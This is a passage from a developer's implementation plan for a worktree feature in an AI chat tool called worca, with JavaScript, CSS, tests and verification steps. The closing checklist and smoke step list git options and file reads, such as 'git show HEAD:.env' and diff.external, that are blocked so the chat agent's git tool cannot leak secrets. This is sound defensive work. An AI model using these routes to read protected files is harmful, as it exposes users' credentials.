    // back to the sweep's own default), and emit the SUMMARY lines via console.*.
    // Do NOT call `sink('ask-worktrees')(...)` directly: `sink` is undefined on a
    // log-less boot and would throw exactly when the sweep did work.
    const r = await sweepAskWorktrees({ log: sink('ask-worktrees') });
    summary.askWorktrees = r;
    if (r.removedDirs || r.prunedRows) {
      console.log(`[worca-ui] ask-worktree sweep: removed ${r.removedDirs} orphan dir(s), dropped ${r.prunedRows} stale row(s)`);
    }
    if (r.failed) console.error(`[worca-ui] ask-worktree sweep: ${r.failed} candidate(s) skipped`);
  } catch (err) {
    console.error(`[worca-ui] ask-worktree sweep failed: ${err && err.message ? err.message : err}`);
  }
```

2. `cmdDoctor` — CAREFUL: the legacy block contains an early `return 0` when mode ≠ detached (`worca-cc.mjs:615`), so the ask sweep must be inserted BEFORE the legacy block (right after the run-root sweep's try/catch, ≈:605). This ordering is NOT unit-covered (moving it after the `return 0` survived mutation) — it is verified in Task 10's smoke (run `worca doctor` and confirm the `ask worktrees:` line prints before the legacy line). Keep the `// P4: BEFORE the legacy return 0` comment as the marker.

```js
  try {
    const { sweepAskWorktrees } = await import('../core/ask/worktrees.mjs');
    const res = await sweepAskWorktrees({ log: (level, msg) => out(level === 'warn' ? c('yellow', msg) : msg) });
    out(`ask worktrees: removed ${res.removedDirs} orphan dir(s), dropped ${res.prunedRows} stale row(s), skipped ${res.failed}`);
  } catch (err) {
    process.stderr.write(`worca doctor: ask-worktree sweep failed: ${err?.message || err}\n`);
  }
```

- [ ] **Step 4: Run tests**

Run: `node --test test/server-boot-sweeps.test.mjs 2>&1 | tail -3`
Expected: PASS, existing order assertions untouched.

- [ ] **Step 5: Commit**

```bash
git add ui/server.mjs src/cli/worca-cc.mjs test/server-boot-sweeps.test.mjs
git commit -m "worca: Ask Worca Worktrees — boot sweep + doctor"
```

---

### Task 9: Chat panel — worktrees button, popover, delete

**Files:**
- Modify: `ui/public/ask-panel.mjs` (composer :344-443, popover section near `openRunInfoPopover` :742, thread actions :771-807, plus the thread-load/turn-end hooks), `ui/public/style.css` (`.ask-*` block from :2806)
- Test: `test/ask-panel-worktrees.test.mjs` (create)

**Interfaces:**
- Consumes: `GET /api/ask/threads/:id` snapshot with `worktrees[]`, list rows with `worktrees` count, `DELETE /api/ask/threads/:id/worktrees/:wtId` (Task 7); the panel's existing `openPopover`, `make`, `svgIcon`, `confirm`, `closePopover` helpers.
- Produces: `[data-ask-wt-btn]` button (hidden at 0), `.ask-pop-worktrees` popover with per-row trash, extended thread-delete confirm copy.

- [ ] **Step 1: Write the failing test**

```js
// test/ask-panel-worktrees.test.mjs
// P4/T9: the "N worktrees" button + popover — count from the snapshot, rows,
// manual delete round trip. Harness + frame driving as in the other
// ask-panel-*.test.mjs files.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { makePanel } from './helpers/ask-panel-harness.mjs';

const TID = 'ask_00000001';
const WT = {
  worktreeId: 'wt_00000001', projectKey: 'demo-00000001', ref: 'worca-cc/feat-1',
  commit: 'abcdef1234567890abcdef1234567890abcdef12',
  path: '/home/u/.worca-cc/ask/ask_00000001/wt/wt_00000001', createdAt: '2026-08-24T00:00:00.000Z',
};

function snapshotHandler(state) {
  return (url, opts) => {
    const method = ((opts && opts.method) || 'GET').toUpperCase();
    if (url === `/api/ask/threads/${TID}` && method === 'GET') {
      return { ok: true, status: 200, json: async () => ({
        thread: { id: TID, title: 'chat', createdAt: 't', updatedAt: 't', model: null, effort: null, sessionId: null, context: null, totals: {} },
        messages: [], attachments: [], runLinks: [], inFlight: null,
        worktrees: state.deleted ? [] : [WT],
      }) };
    }
    if (url === `/api/ask/threads/${TID}/worktrees/${WT.worktreeId}` && method === 'DELETE') {
      state.deleted = true;
      return { ok: true, status: 200, json: async () => ({ ok: true, steps: [] }) };
    }
    return { ok: true, status: 200, json: async () => ({ threads: [] }) };
  };
}

// The harness injects `confirm` as a dep (default: resolve true) and `storage`
// for the stored-thread pointer — key 'worca-cc.ask.thread' (ask-panel.mjs:96).
function seededStorage() {
  const map = new Map([['worca-cc.ask.thread', TID]]);
  return {
    getItem: (k) => (map.has(k) ? map.get(k) : null),
    setItem: (k, v) => { map.set(k, String(v)); },
    removeItem: (k) => { map.delete(k); },
  };
}

test('worktrees button appears with the count after a thread loads; popover lists rows; trash deletes', async () => {
  const state = { deleted: false };
  const confirms = [];
  const ctx = makePanel({
    fetchHandler: snapshotHandler(state),
    storage: seededStorage(),
    confirm: async (opts) => { confirms.push(opts); return true; },
  });
  ctx.panel.open();                       // ensureFirstOpen → switchThread(TID) → snapshot
  await ctx.tick(); await ctx.tick(); await ctx.tick();
  ctx.flush();
  const btn = ctx.doc.querySelector('[data-ask-wt-btn]');
  assert.ok(btn, 'button exists');
  assert.equal(btn.hidden, false);
  assert.match(btn.textContent, /1 worktree\b/);
  btn.click();
  await ctx.tick(); await ctx.tick(); await ctx.tick();
  const pop = ctx.doc.querySelector('.ask-pop-worktrees');
  assert.ok(pop, 'popover open');
  assert.match(pop.textContent, /demo-00000001 · worca-cc\/feat-1@abcdef1/);
  assert.match(pop.textContent, /\/wt\/wt_00000001/);
  const trash = pop.querySelector('.ask-wt-row .ask-thread-trash');
  assert.ok(trash, 'per-row trash');
  trash.click();
  await ctx.tick(); await ctx.tick(); await ctx.tick();
  assert.equal(confirms.length, 1, 'confirm dialog invoked');
  assert.match(confirms[0].message, /branches are untouched/);
  assert.equal(state.deleted, true, 'DELETE was issued');
  assert.equal(ctx.doc.querySelector('[data-ask-wt-btn]').hidden, true, 'count back to 0 hides the button');
});

test('turn end refetches worktrees (count refresh on ask-done)', async () => {
  // M10: without the afterFrame hook, a turn that created a worktree leaves a stale
  // count. Drive a CLEAN, stamped ask-start → ask-done turn (NO seq gap) and assert
  // a SECOND snapshot GET. The clean seq is load-bearing: `pushServerFrame` early-
  // returns unless `frame.threadId === st.threadId` and only runs `afterFrame` after
  // a successful `st.model.apply(frame)`, and a seq GAP would trigger resync()→
  // loadThread()→a snapshot GET that satisfies the assertion WITHOUT refreshWorktrees
  // (a vacuous green). Copy the exact frame shape from ask-panel-composer.test.mjs
  // (~:156-164): the ask-start carries threadId+messageId+startedAt+seq, the ask-done
  // the same threadId+messageId and the next seq.
  const state = { deleted: false, snapshots: 0 };
  const handler = (url, opts) => {
    if (url === `/api/ask/threads/${TID}` && (((opts && opts.method) || 'GET').toUpperCase() === 'GET')) state.snapshots += 1;
    return snapshotHandler(state)(url, opts);
  };
  const ctx = makePanel({ fetchHandler: handler, storage: seededStorage(), confirm: async () => true });
  ctx.panel.open();
  await ctx.tick(); await ctx.tick(); await ctx.tick(); ctx.flush();
  const before = state.snapshots;
  // Adapt these two frames to the real shape in ask-panel-composer.test.mjs; the point
  // is threadId===TID, contiguous seq (no gap), and a terminal ask-done.
  ctx.panel.pushServerFrame({ type: 'ask-start', threadId: TID, messageId: 'm1', startedAt: 't', seq: 1 });
  ctx.panel.pushServerFrame({ type: 'ask-done', threadId: TID, messageId: 'm1', seq: 2 });
  await ctx.tick(); await ctx.tick(); await ctx.tick();
  assert.equal(state.snapshots, before + 1, 'exactly one refetch from afterFrame — no resync, no double GET');
});

test('cancel at the confirm dialog issues NO delete and leaves the button visible', async () => {
  // M12: the harness confirm defaults to true, so the destructive path is otherwise
  // untested. A confirm→false must NOT fetch DELETE and must keep the worktree.
  const state = { deleted: false };
  const ctx = makePanel({ fetchHandler: snapshotHandler(state), storage: seededStorage(), confirm: async () => false });
  ctx.panel.open();
  await ctx.tick(); await ctx.tick(); await ctx.tick(); ctx.flush();
  ctx.doc.querySelector('[data-ask-wt-btn]').click();
  await ctx.tick(); await ctx.tick();
  ctx.doc.querySelector('.ask-wt-row .ask-thread-trash').click();
  await ctx.tick(); await ctx.tick(); await ctx.tick();
  assert.equal(state.deleted, false, 'cancelled → no DELETE issued');
  assert.equal(ctx.doc.querySelector('[data-ask-wt-btn]').hidden, false, 'worktree still present, button visible');
});
```
The snapshot fetch runs through **`loadThread`** (`switchThread` only delegates to it), so `setWorktrees(snap.worktrees)` must land in `loadThread`'s success body — mutation M14 proved the test canNOT catch the wrong placement (a `switchThread(id).then(snap => …)` passes this test yet silently drops the `resync()`/`onHello()` reconnect path), so the plan MUST specify `loadThread` explicitly (Step 3) rather than relying on the test to pin it.

- [ ] **Step 2: Run to verify failure**

Run: `node --test test/ask-panel-worktrees.test.mjs 2>&1 | tail -3`
Expected: FAIL — `[data-ask-wt-btn]` is null.

- [ ] **Step 3: Implement in `ask-panel.mjs`**

1. Composer (in `buildComposer`, between the meter and `agentsBtn`):

```js
    const wtBtn = make('button', 'ask-agents-btn ask-wt-btn');
    wtBtn.type = 'button';
    wtBtn.setAttribute('data-ask-wt-btn', '');
    wtBtn.hidden = true;
    el.wtBtn = wtBtn;
    el.wtBtnLabel = make('span', null, '0 worktrees');
    wtBtn.appendChild(el.wtBtnLabel);
    wtBtn.appendChild(svgIcon('M6 15l6-6 6 6', 11, 2));
    wtBtn.addEventListener('click', () => openWorktreesPopover(wtBtn));
    row.appendChild(wtBtn);
```

2. State + fetch + popover (place next to `openRunInfoPopover`):

```js
  // ---- worktrees (P4 §10) ---------------------------------------------------
  function setWorktrees(list) {
    st.worktrees = Array.isArray(list) ? list : [];
    if (!el.wtBtn) return;
    el.wtBtn.hidden = st.worktrees.length === 0;
    el.wtBtnLabel.textContent = `${st.worktrees.length} worktree${st.worktrees.length === 1 ? '' : 's'}`;
  }

  function refreshWorktrees() {
    if (!st.threadId) { setWorktrees([]); return Promise.resolve([]); }
    const tid = st.threadId;
    return Promise.resolve()
      .then(() => fetch(`/api/ask/threads/${tid}`))
      .then((r) => (r && r.ok ? r.json() : null))
      .catch(() => null)
      .then((snap) => {
        if (st.threadId !== tid) return st.worktrees;
        setWorktrees(snap && Array.isArray(snap.worktrees) ? snap.worktrees : []);
        return st.worktrees;
      });
  }

  const wtShortSha = (c) => (typeof c === 'string' ? c.slice(0, 7) : '');

  async function deleteWorktree(w) {
    const ok = await confirm({
      title: 'Remove this worktree?',
      message: `${w.projectKey} @ ${w.ref} is checked out at ${w.path}. The checkout is deleted; branches are untouched.`,
      confirmLabel: 'Remove',
      danger: true,
    });
    if (!ok) return;
    try { await fetch(`/api/ask/threads/${st.threadId}/worktrees/${w.worktreeId}`, { method: 'DELETE' }); } catch { /* refetch shows the truth */ }
    await refreshWorktrees();
  }

  function openWorktreesPopover(trigger) {
    const panel = openPopover({ panelClass: 'ask-pop-runinfo ask-pop-worktrees', trigger, build: (p) => {
      p.appendChild(make('div', 'ask-pop-caption', 'Worktrees this chat'));
    } });
    if (!panel) return;
    refreshWorktrees().then((list) => {
      if (!st.popover || st.popover.panel !== panel) return;
      if (!list.length) { panel.appendChild(make('div', 'ask-pop-empty', 'No worktrees open.')); return; }
      for (const w of list) {
        const row = make('div', 'ask-runinfo-row ask-wt-row');
        const col = make('span', 'ask-runinfo-col');
        col.appendChild(make('span', 'ask-runinfo-name', `${w.projectKey} · ${w.ref}@${wtShortSha(w.commit)}`));
        const path = make('span', 'ask-runinfo-sub ask-wt-path', w.path);
        path.title = 'Click to copy';
        path.addEventListener('click', () => { try { win.navigator.clipboard.writeText(w.path); } catch { /* unsupported */ } });
        col.appendChild(path);
        row.appendChild(col);
        // AGE (spec §10 row: project · ref@sha7 · AGE · path · trash). Reuses the
        // run-info popover's `.ask-runinfo-elapsed` cell — its `margin-left:auto`
        // (style.css:3028) also right-aligns the trash that follows. fmtElapsed + now
        // are already in scope (the run-info popover uses both).
        row.appendChild(make('span', 'ask-runinfo-elapsed', w.createdAt ? fmtElapsed(now() - Date.parse(w.createdAt)) : '—'));
        const trash = make('button', 'ask-thread-trash');
        trash.type = 'button';
        trash.setAttribute('aria-label', `Remove worktree ${w.worktreeId}`);
        trash.appendChild(svgIcon('M4 7h16M9.5 7V4.8h5V7M6.5 7l.9 12.2h9.2L17.5 7', 14, 1.8));
        trash.addEventListener('click', (e) => { e.stopPropagation(); closePopover({ focusTrigger: false }); deleteWorktree(w); });
        row.appendChild(trash);
        panel.appendChild(row);
      }
    });
  }
```
(`win` is the injected window from `createAskPanel`'s deps — the module already uses `win.btoa`/`win.getSelection`; keep the try/catch, jsdom has no clipboard.)

3. Hooks — three call sites (the v1 anchors were WRONG; these are the real ones):
   - **`loadThread`** (`ask-panel.mjs:1341-1362`, the snapshot-success handler where `st.model.load(snap)` / `renderTranscript()` / `updateMeters()` run — `switchThread` at :1364 is a 4-line delegator with no `snap` in scope, and `loadThread` also serves `resync()`/`onHello()` which a hook on `switchThread` would miss): add `setWorktrees(snap.worktrees);` right after `updateMeters();` (≈:1355).
   - In `newThread()` (:771, resets `st`): `setWorktrees([]);`
   - **Turn end — in the terminal-frame branch, NOT `updateSendStop`.** `updateSendStop()` also runs from `loadThread`, so a running→idle latch there fires a SECOND `GET /api/ask/threads/:id` on every resync and **breaks `test/ask-panel-stream.test.mjs` (`3 !== 2`, proven by revert/reapply)**. Put the refresh in `afterFrame`'s `ask-done`/`ask-error` branch (≈:1424 / the terminal-frame handler that calls `stopElapsed(); updateSendStop();`) and add NO `st.wtWasRunning` latch:
```js
    else if (frame.type === 'ask-done' || frame.type === 'ask-error') {
      stopElapsed(); updateSendStop(); announce('answer finished');
      refreshWorktrees();   // P4: a finished turn may have created/removed/navigated worktrees
    }
```
(Do NOT add `st.wtWasRunning`. The turn-end path fires exactly once per turn here, so no latch is needed. `updateSendStop`'s local is named `streaming`, not `running` — irrelevant now that the hook is out of it.)

4. Thread-delete confirm (in `deleteThread`) — worktree-aware copy:

```js
      message: `“${t.title || '(untitled)'}” and its transcript are removed${t.worktrees ? ` along with ${t.worktrees} worktree${t.worktrees === 1 ? '' : 's'}` : ''}. This cannot be undone.`,
```

5. `ui/public/style.css` (inside the `.ask-*` block):

```css
/* The button shares .ask-agents-btn, which is display:flex — that AUTHOR rule
   outranks the UA [hidden]{display:none}, so without this twin the button never
   hides and shows a permanent "0 worktrees" (jsdom's .hidden property test cannot
   catch it — verify in the Task 10 smoke). style.css uses this pattern throughout. */
.ask-wt-btn[hidden] { display: none; }
/* .ask-pop-worktrees inherits .ask-pop-runinfo's right/bottom offset, which is
   calibrated for the AGENTS button; the worktrees button sits ~90px to its left,
   so the popover would open detached from its trigger. This `right` is a STARTING
   value — calibrate it against the real layout in the Task 10 smoke. */
.ask-pop-worktrees { min-width: 340px; right: 187px; }
.ask-wt-row .ask-runinfo-sub.ask-wt-path { cursor: pointer; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; max-width: 260px; }
.ask-wt-row .ask-thread-trash { flex: none; }   /* the .ask-runinfo-elapsed margin-left:auto right-aligns it */
```

- [ ] **Step 4: Run tests**

Run: `node --test test/ask-panel-worktrees.test.mjs test/ask-panel.test.mjs test/ask-panel-composer.test.mjs test/ui-ask-style.test.mjs 2>&1 | tail -3`
Expected: PASS (style test may pin the `.ask-*` selector inventory — extend it).

- [ ] **Step 5: Commit**

```bash
git add ui/public/ask-panel.mjs ui/public/style.css test/ask-panel-worktrees.test.mjs test/ui-ask-style.test.mjs
git commit -m "worca: Ask Worca Worktrees — panel popover + manual delete"
```

---

### Task 10: Full-suite verification

**Files:** none new.

- [ ] **Step 1: Full suite**

Run: `npm test 2>&1 | tail -6`
Expected: 0 failures; total = the Task 0 baseline (**3397**) + all new tests (~31 behavioural + the mutation-audit tests this v2 adds — a full 1–10 dry-run measured 3416–3428 before the extra security/vacuity tests; the exact total is whatever this run reports, record it). Fix regressions at their cause (grep for pins on `--tools`, `ASK_DENY_RULES`, `envAllowlist`, the snapshot keys, the 11-name tool list, and the `user_version` 20 pins if anything red).

- [ ] **Step 2: Manual smoke (dev server)**

Start the UI (`npm start` or `node ui/server.mjs`), open Ask Worca, and drive one real conversation: "open a worktree of <project> at master and show me the last 3 commits" → expect `open_worktree` + `git log` tool blocks, the "1 worktree" button (verify it actually HIDES at 0 — jsdom can't), the popover opening **anchored to its own trigger** (calibrate `.ask-pop-worktrees { right }`), a row with `ref@sha7 · age · copyable path`, manual delete working, and thread delete leaving `git worktree list` clean in the project. Also spot-check the layer-4 defences that no unit test fully exercises in a browser: in a repo containing a `.env`, confirm `git diff --color=always`, `git log -p`, and `git show HEAD:.env` do NOT surface the secret; confirm a `git fetch` against an unreachable/credential-prompting remote fails fast (no ~2-minute hang); and run `worca doctor`, confirming the `ask worktrees:` line prints before the legacy line. Record all outcomes in the gates file.

- [ ] **Step 3: Commit anything the smoke shook out**, message `worca: Ask Worca Worktrees — smoke fixes`.

---

## Self-review checklist (run after writing, before handoff)

- Spec coverage: D1→T4/T5 (open by ref + runId sugar), D2/E1→T0/T6, D3/D4→T2/T4, D5→T3/T5, D6→T3/T6 (prompt rule 8), D7→T4 paths, D8→T1/T7, D9→T3/T4, D10→T9, D11 (no card)→T5 direct tool, D12→T3 fetch + T6 SSH_AUTH_SOCK, D13→T0. Sweep §5→T4/T8. Docs §7/§10→T6.
- Security-hardening coverage (added in v2 after the planning review demonstrated live leaks): arbitrary-read/exec git options (`--no-index`/`--contents`/`-f`/`--file`/`--filters`/`--color`/`-O…`) → T3 `BLOCKED_ANYWHERE` + prefix guard; branch-creating `switch -c/-C` → T3 `NAV_BLOCKED`; `cat-file` removed → T3; the protected-path floor over EVERY patch subcommand + raw-blob drop (`anyHeader`) + `-c diff.external=`/`--no-ext-diff`/`--no-color` + protected-pathspec pre-reject → T5 handler; `GIT_PAGER`/`GIT_TERMINAL_PROMPT`/askpass env → T2; the enumerated-deny net-regression (agents/, workflows/, projects.json, workspaces.json, chat-context.json) + SOURCE-derived pin → T6; native-Read symlink/`..` escape probe + fallbacks → T0 E1.
- Empirical validation: a full 1–10 dry-run reached a green suite in a clone; the redaction, allowlist, cap, cascade, sweep-DB-throw, migration-ladder, `switch -c`, `--no-index`/`--contents`/`-O`, and turn-end/cancel paths are all pinned by tests that were mutation-audited to kill their mutant (baseline 3397 → ~3416–3428 + the security/vacuity tests).
- Consciously-accepted deviations (not defects): (1) §5 step-2 "registered-project" check is enforced on the `(projectKey, ref)` path but the `runId` path resolves the recorded run's project (bounded by the pipeline row + its `store_meta`, read-only, not an arbitrary path) — tightening to current-registration would require the workspace fixtures to use real `projectKey(repo)` values and is out of scope; (2) `SSH_AUTH_SOCK` is granted on the whole `claude` process (`envAllowlist`) rather than the MCP child only (locked D12; no sub-shell to leak it to); (3) the thread-delete worktree cascade lives on the HTTP route, not `askDeleteThread` itself — low risk today (the only other caller, `sweepEmptyThreads`, deletes empty threads that have no worktrees), noted for a future writable path; (4) `git switch -c` relies on `NAV_BLOCKED` now, no longer on git's `--detach` mutual-exclusion accident; (5) a blob whose CONTENT contains a literal `diff --git a/x b/x` line makes `show <blob-sha>` look like a patch (`hasPatch` true), so the section filter keeps the attacker-authored section — accepted as marginal (the attacker leaks only content they themselves committed to a registered project's history, and any genuinely protected filename in that fake header is still dropped).
- Out of scope confirmed absent: no Bash, no push/PR, no TTL, no settings UI for caps, no submodule handling.
